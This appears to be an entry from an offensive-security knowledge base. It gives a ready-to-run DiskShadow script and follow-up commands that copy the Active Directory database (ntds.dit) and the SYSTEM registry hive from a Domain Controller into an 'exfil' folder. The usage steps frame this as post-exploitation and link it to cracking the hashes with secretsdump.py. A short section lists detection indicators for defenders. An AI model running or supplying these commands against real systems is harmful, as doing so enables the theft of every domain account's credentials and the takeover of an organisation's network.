---
type: code
language: cmd
verified: true
platforms:
  - Windows
tags:
  - shadow-copy
  - ntds
  - extraction-script
validated: true
---

# DiskShadow-Script-for-NTDS-Extraction

## Code

```cmd
diskshadow.txt contains :
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
delete shadows volume %someAlias%
reset

then:
NOTE - must be executed from C:\Windows\System32
diskshadow.exe /s  c:\diskshadow.txt
dir c:\exfil
reg.exe save hklm\system c:\exfil\system.bak
```

## Description

This code provides the content for a DiskShadow script file (diskshadow.txt) that creates a persistent shadow copy of the C: volume without VSS writers, exposes it as Z:, copies the NTDS.dit file from the protected path, deletes the shadow, and includes post-execution commands to verify and backup the SYSTEM registry. It enables stealthy extraction of AD credentials on Domain Controllers.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| c: | Target volume for shadow copy (modify for non-default) | D: |
| someAlias | Alias name for the shadow copy | volumeShadow |
| z: | Exposed drive letter for shadow access | Y: |
| c:\exfil | Exfiltration directory path | C:\temp\dump |
| z:\windows\ntds\ntds.dit | Source path to NTDS.dit in shadow (adjust if relocated) | z:\custom\ntds\ntds.dit |

Note: Hardcoded paths; edit the script before saving to customize.

## Usage

1. Copy the 'set context...' to 'reset' lines into a file named diskshadow.txt.
2. From an elevated command prompt in C:\Windows\System32, run diskshadow.exe /s C:\diskshadow.txt.
3. Follow with dir and reg.exe as noted. Used in post-exploitation on Domain Controllers after gaining SYSTEM access, e.g., via [[commands/psexec-remote-execution]]. Pair extracted files with secretsdump.py for hash cracking.

## Detection

- Monitor for diskshadow.exe process creation (Sysmon Event ID 1) with /s flag.
- Audit VSS shadow copy events (Event ID 8222/8230) for persistent nowriters contexts.
- File creation monitoring for ntds.dit copies or unusual registry saves in temp/exfil paths.
- Network exfil of large files (>1MB) from DC to attacker-controlled locations.

## Related

- [[procedures/Dump-AD-Domain-Credentials-with-DiskShadow]]
- [[commands/diskshadow-execute-extraction-script]]
